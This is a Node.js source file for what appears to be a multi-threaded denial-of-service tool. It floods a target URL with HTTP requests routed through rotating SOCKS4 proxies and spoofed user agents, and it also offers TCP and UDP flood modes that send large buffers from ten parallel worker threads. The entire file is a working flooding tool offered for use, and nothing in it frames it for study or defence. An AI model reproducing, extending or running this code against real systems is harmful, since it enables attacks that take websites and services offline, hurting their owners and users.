const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const http = require('http');
const dgram = require('dgram');
const net = require('net');
const { SocksClient } = require('socks');
const layer7 = require('./methods/layer7');
const fs = require('fs');

const socks4Proxies = fs.readFileSync('socks4.txt', 'utf8').split('\n').filter(Boolean);
const userAgents = fs.readFileSync('uas.txt', 'utf8').split('\n').filter(Boolean);

if (!isMainThread) {
    const { targetUrl, delay, kbSize, method } = workerData;
    const target = new URL(targetUrl);

    async function sendPacket(proxy) {
        const [proxyIp, proxyPort] = proxy.split(':');

        if (layer7[method]) {
            const options = {
                proxy: {
                    ipaddress: proxyIp,
                    port: parseInt(proxyPort),
                    type: 4, 
                },
                destination: {
                    host: target.hostname,
                    port: target.port || (target.protocol === 'https:' ? 443 : 80),
                },
                command: 'connect',
                timeout: 10000, 
            };

            try {
                const { socket } = await SocksClient.createConnection(options);
                const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

                const req = http.request({
                    host: target.hostname,
                    port: target.port || 80,
                    path: target.pathname,
                    method: 'GET',
                    headers: {
                        'User-Agent': userAgent,
                    },
                    socket: socket,
                }, (res) => {
                    console.log(`LDS: Packet sent to ${targetUrl} via ${proxy} with method ${method}`);
                });

                req.on('error', (err) => {
                    if (err.code === 'ECONNRESET') {
                        console.error(`LDS: Connection reset by ${proxy}`);
                    } else {
                        console.error(`LDS: Error with ${proxy}`);
                    }
                });

                req.end();
            } catch (err) {
                console.error(`LDS: Failed to connect to ${targetUrl} via ${proxy}`);
            }
        } else {
            if (method === 'SYN_FLOOD') {
                const client = new net.Socket();
                client.connect(target.port || 80, target.hostname, () => {
                    client.write(Buffer.alloc(kbSize * 1024)); 
                });

                client.on('error', (err) => {
                    console.error(`LDS: SYN Flood Error: ${err.message}`);
                });
            } else if (method === 'UDP_FLOOD') {
                const client = dgram.createSocket('udp4');
                const payload = Buffer.alloc(kbSize * 1024);

                client.send(payload, 0, payload.length, target.port || 80, target.hostname, (err) => {
                    if (err) {
                        console.error(`LDS: UDP Flood Error: ${err.message}`);
                    }
                });
            } else {
                console.error(`LDS: Method ${method} not found.`);
            }
        }
    }

    setInterval(() => {
        const proxy = socks4Proxies[Math.floor(Math.random() * socks4Proxies.length)];
        sendPacket(proxy);
    }, delay);
}

function start(targetUrl, delay, kbSize, method) {
    const numWorkers = 10; 
    for (let i = 0; i < numWorkers; i++) {
        const worker = new Worker(__filename, {
            workerData: { targetUrl, delay, kbSize, method },
        });

        worker.on('error', (err) => {
            console.error(`LDS: Worker error: ${err.message}`);
        });

        worker.on('exit', (code) => {
            if (code !== 0) {
                console.error(`LDS: Worker stopped with exit code ${code}`);
            }
        });
    }
}

module.exports = { start };
